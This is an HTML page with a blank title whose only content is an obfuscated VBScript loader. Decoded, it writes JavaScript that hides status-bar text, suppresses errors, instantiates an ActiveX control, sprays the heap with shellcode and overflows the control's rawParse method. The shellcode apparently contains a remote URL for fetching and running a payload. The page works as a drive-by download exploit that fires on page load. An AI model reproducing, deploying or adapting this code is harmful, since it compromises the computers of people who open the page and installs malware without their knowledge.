<html>
<head>
<title> </title>
</head>
<body>
<script language="VBScript">
function rechange(k)
s=Split(k,"$")
t=""
For i = 0 To UBound(s)
a=Chr(eval(s(i)))
t=t&a
Next
rechange=t
End Function
t="13$10$60$115$99$114$105$112$116$32$108$97$110$103$117$97$103$101$61$34$106$97$118$97$115$99$114$105$112$116$34$62$13$10$115$101$116$73$110$116$101$114$118$97$108$40$39$99$108$101$97$114$65$108$108$40$41$39$44$49$48$41$59$13$10$102$117$110$99$116$105$111$110$32$99$108$101$97$114$65$108$108$40$41$13$10$123$13$10$13$10$32$32$32$32$119$105$110$100$111$119$46$115$116$97$116$117$115$61$39$32$32$32$32$39$59$13$10$13$10$125$13$10$60$47$115$99$114$105$112$116$62$13$10$13$10$13$10$60$83$67$82$73$80$84$32$108$97$110$103$117$97$103$101$61$34$106$97$118$97$115$99$114$105$112$116$34$62$13$10$119$105$110$100$111$119$46$111$110$101$114$114$111$114$32$61$32$102$117$110$99$116$105$111$110$32$40$41$123$114$101$116$117$114$110$32$116$114$117$101$125$59$13$10$13$10$100$111$99$117$109$101$110$116$46$119$114$105$116$101$40$34$60$111$98$106$101$34$43$34$99$116$32$99$108$97$115$115$105$100$61$39$99$108$115$105$100$58$54$66$69$34$43$34$53$50$69$34$43$34$49$68$45$69$53$56$34$43$34$54$45$52$34$43$34$55$52$102$45$65$54$34$43$34$69$50$45$49$65$34$43$34$56$53$34$43$34$65$57$66$34$43$34$52$68$34$43$34$57$70$66$39$32$105$100$61$39$116$97$114$103$101$116$39$62$60$47$111$98$106$101$99$116$62$34$41$13$10$13$10$105$102$32$40$116$121$112$101$111$102$40$100$111$99$117$109$101$110$116$46$97$108$108$46$116$97$114$103$101$116$46$114$97$119$80$97$114$115$101$41$61$61$34$117$110$100$101$102$105$110$101$100$34$41$13$10$123$13$10$32$32$108$111$99$97$116$105$111$110$46$114$101$112$108$97$99$101$40$34$97$98$111$117$116$58$98$108$97$110$107$34$41$59$13$10$125$13$10$101$108$115$101$13$10$123$13$10$13$10$32$32$32$32$32$32$32$32$32$32$118$97$114$32$115$104$101$108$108$99$111$100$101$32$61$32$117$110$101$115$99$97$112$101$40$34$37$117$57$48$57$48$34$43$34$37$117$57$48$57$48$34$43$32$13$10$34$37$117$101$102$101$57$34$43$34$37$117$48$48$48$48$37$34$43$34$117$53$97$48$48$37$117$97$49$54$52$37$117$48$48$51$48$37$117$48$48$48$48$37$117$52$48$56$98$37$117$56$98$48$99$34$32$43$13$10$34$37$117$49$99$55$48$37$117$56$98$97$100$37$117$48$56$52$48$37$34$43$34$117$100$56$56$98$37$117$55$51$56$34$43$34$98$37$117$56$98$51$99$37$117$49$101$55$52$37$117$48$51$55$56$34$32$43$13$10$34$37$117$56$98$102$51$37$117$50$48$55$34$43$34$101$37$117$102$98$48$34$43$34$51$37$117$34$43$34$52$101$56$98$37$117$51$51$49$52$37$117$53$54$101$100$37$117$53$49$53$55$37$117$51$102$56$98$34$32$43$13$10$34$37$117$102$98$48$51$37$117$102$50$56$34$43$34$98$37$117$48$101$54$97$37$117$102$51$53$57$37$117$55$52$97$54$37$117$53$57$34$43$34$48$56$37$117$56$51$53$102$37$117$48$52$99$55$34$32$43$13$10$34$37$117$101$50$52$53$37$117$53$57$34$43$34$101$57$37$117$53$101$53$102$34$43$34$37$117$99$100$56$98$37$117$52$54$56$98$37$117$48$51$50$52$34$43$34$37$117$100$49$99$51$37$117$48$51$101$49$34$32$43$13$10$34$37$117$51$51$99$49$37$117$54$54$99$57$37$117$48$56$56$98$37$117$52$54$56$98$37$117$48$51$49$99$37$117$99$49$99$51$37$34$43$34$117$48$50$101$49$37$117$99$49$48$51$34$32$43$13$10$34$37$117$48$48$56$98$37$117$99$51$48$51$37$117$102$34$43$34$97$56$98$37$117$102$55$56$98$37$117$99$54$56$51$37$117$56$34$43$34$98$48$101$37$117$54$97$100$48$37$117$53$57$48$52$34$32$43$13$10$34$37$117$54$97$101$56$37$117$48$48$48$48$37$117$56$34$43$34$51$48$48$37$117$48$100$99$54$37$117$34$43$34$53$54$53$50$37$117$53$55$102$102$34$43$34$37$117$53$97$102$99$37$117$100$56$56$98$34$32$43$13$10$34$37$117$48$49$54$97$37$117$101$34$43$34$56$53$57$37$117$34$43$34$48$48$53$55$37$117$34$43$34$48$48$48$48$37$117$99$54$56$51$37$117$53$54$49$51$37$117$56$48$52$54$37$117$56$48$51$101$34$32$43$13$10$34$37$117$102$97$55$53$37$117$51$54$56$48$37$117$53$101$34$43$34$56$48$37$117$101$99$56$51$37$117$56$98$52$48$37$117$99$55$100$99$37$117$54$51$48$51$37$117$54$52$54$100$34$32$43$13$10$34$37$117$52$51$50$48$37$34$43$34$117$52$51$52$51$37$117$34$43$34$54$54$52$51$37$117$48$51$99$55$37$34$43$34$117$54$51$50$102$37$117$52$51$52$51$37$117$48$51$99$54$37$117$52$51$50$48$34$32$43$13$10$34$37$117$50$48$54$97$37$117$102$102$53$51$37$117$101$99$53$55$37$34$43$34$117$48$52$99$55$37$117$53$99$48$51$37$117$50$101$54$34$43$34$49$37$117$99$55$54$34$43$34$53$37$117$48$51$52$52$34$32$43$13$10$34$37$117$55$56$48$52$37$117$48$48$54$53$37$117$51$51$48$48$37$117$53$48$99$48$37$117$34$43$34$53$51$53$48$37$117$53$48$53$54$37$117$53$55$102$102$37$117$56$98$102$99$34$32$43$13$10$34$37$117$54$97$100$99$37$117$53$51$48$48$37$117$53$55$102$102$37$117$54$56$102$48$37$117$50$52$53$49$37$117$48$48$52$48$37$117$102$102$53$56$37$117$51$51$100$48$34$32$43$13$10$34$37$117$97$99$99$48$37$117$99$48$56$53$37$117$102$57$55$53$37$117$53$50$53$49$37$117$53$51$53$54$37$117$100$50$102$102$37$117$53$57$53$97$37$117$101$50$97$98$34$32$43$13$10$34$37$117$51$51$101$101$37$117$99$51$99$48$37$34$43$34$117$48$99$101$56$37$117$102$102$102$102$34$43$34$37$117$52$55$102$102$37$117$55$52$54$34$43$34$53$37$117$55$50$53$34$43$34$48$37$117$54$51$54$102$34$32$43$13$10$34$37$117$54$52$52$49$37$117$55$50$54$52$37$117$55$51$54$53$37$117$48$48$55$51$37$117$54$53$52$55$37$117$53$51$55$52$37$117$55$51$55$57$37$117$54$53$55$52$34$32$43$13$10$34$37$117$52$52$54$100$37$117$55$50$54$57$37$34$43$34$117$54$51$54$53$37$117$54$102$55$52$37$117$34$43$34$55$57$55$50$37$117$48$48$34$43$34$52$49$37$117$54$57$53$55$37$117$52$53$54$101$34$32$43$13$10$34$37$117$54$53$55$56$34$43$34$37$117$48$48$54$51$37$117$55$56$52$53$37$117$55$52$54$57$37$117$54$56$53$52$37$117$54$53$55$50$37$117$54$52$54$49$37$117$52$99$48$48$34$32$43$13$10$34$37$117$54$49$54$102$37$117$34$43$34$52$99$54$52$37$117$54$50$54$57$37$117$54$49$55$50$37$117$55$57$55$50$37$117$48$48$52$49$37$117$55$50$55$53$37$117$54$100$54$99$34$32$43$13$10$34$37$117$54$101$54$102$37$117$53$53$48$34$43$34$48$37$117$52$99$53$50$37$117$54$102$52$52$34$43$34$37$117$54$101$55$55$37$117$54$102$54$99$37$117$54$52$54$49$37$117$54$102$53$52$34$32$43$13$10$34$37$117$54$57$52$54$37$117$54$53$54$99$37$117$48$48$34$43$34$52$49$37$117$55$52$54$56$37$117$55$48$34$43$34$55$52$37$117$50$70$51$65$37$34$43$34$117$54$65$50$70$37$117$50$69$55$51$37$117$51$48$54$66$34$43$13$10$34$37$117$51$48$34$43$34$51$49$37$117$50$69$51$50$37$34$43$34$117$54$70$54$51$37$117$50$70$54$68$37$117$54$49$54$52$37$117$54$49$55$34$43$34$52$37$117$54$55$50$69$37$117$54$54$54$57$34$41$59$13$10$13$10$118$97$114$32$98$105$103$98$108$111$99$107$84$101$109$112$32$61$32$117$110$101$115$99$97$112$101$40$34$37$117$57$48$57$48$37$117$57$48$57$48$34$41$59$13$10$118$97$114$32$98$105$103$98$108$111$99$107$61$98$105$103$98$108$111$99$107$84$101$109$112$59$13$10$118$97$114$32$104$101$97$100$101$114$115$105$122$101$32$61$32$50$48$59$13$10$118$97$114$32$115$108$97$99$107$115$112$97$99$101$32$61$32$104$101$97$100$101$114$115$105$122$101$43$115$104$101$108$108$99$111$100$101$46$108$101$110$103$116$104$59$13$10$119$104$105$108$101$32$40$98$105$103$98$108$111$99$107$46$108$101$110$103$116$104$60$115$108$97$99$107$115$112$97$99$101$41$32$98$105$103$98$108$111$99$107$43$61$98$105$103$98$108$111$99$107$59$13$10$102$105$108$108$98$108$111$99$107$32$61$32$98$105$103$98$108$111$99$107$46$115$117$98$115$116$114$105$110$103$40$48$44$32$115$108$97$99$107$115$112$97$99$101$41$59$13$10$98$108$111$99$107$32$61$32$98$105$103$98$108$111$99$107$46$115$117$98$115$116$114$105$110$103$40$48$44$32$98$105$103$98$108$111$99$107$46$108$101$110$103$116$104$45$115$108$97$99$107$115$112$97$99$101$41$59$13$10$119$104$105$108$101$40$98$108$111$99$107$46$108$101$110$103$116$104$43$115$108$97$99$107$115$112$97$99$101$60$48$120$52$48$48$48$48$41$32$98$108$111$99$107$32$61$32$13$10$98$108$111$99$107$43$98$108$111$99$107$43$102$105$108$108$98$108$111$99$107$59$13$10$109$101$109$111$114$121$32$61$32$110$101$119$32$65$114$114$97$121$40$41$59$13$10$102$111$114$32$40$120$61$48$59$32$120$60$51$48$48$59$32$120$43$43$41$32$109$101$109$111$114$121$91$120$93$32$61$32$98$108$111$99$107$32$43$32$115$104$101$108$108$99$111$100$101$59$13$10$118$97$114$32$98$117$102$102$101$114$32$61$32$39$39$59$13$10$119$104$105$108$101$32$40$98$117$102$102$101$114$46$108$101$110$103$116$104$32$60$32$52$48$53$55$41$32$98$117$102$102$101$114$43$61$34$92$120$48$97$92$120$48$97$92$120$48$97$92$120$48$97$34$59$13$10$98$117$102$102$101$114$43$61$34$92$120$48$97$34$59$13$10$98$117$102$102$101$114$43$61$34$92$120$48$97$34$59$13$10$98$117$102$102$101$114$43$61$34$92$120$48$97$34$59$13$10$98$117$102$102$101$114$43$61$34$92$120$48$97$92$120$48$97$92$120$48$97$92$120$48$97$34$59$13$10$98$117$102$102$101$114$43$61$34$92$120$48$97$92$120$48$97$92$120$48$97$92$120$48$97$34$59$32$13$10$116$97$114$103$101$116$46$114$97$119$80$97$114$115$101$40$98$117$102$102$101$114$41$59$13$10$125$13$10$60$47$115$99$114$105$112$116$62"
document.write(rechange(t))
</script>
</body>
</html>
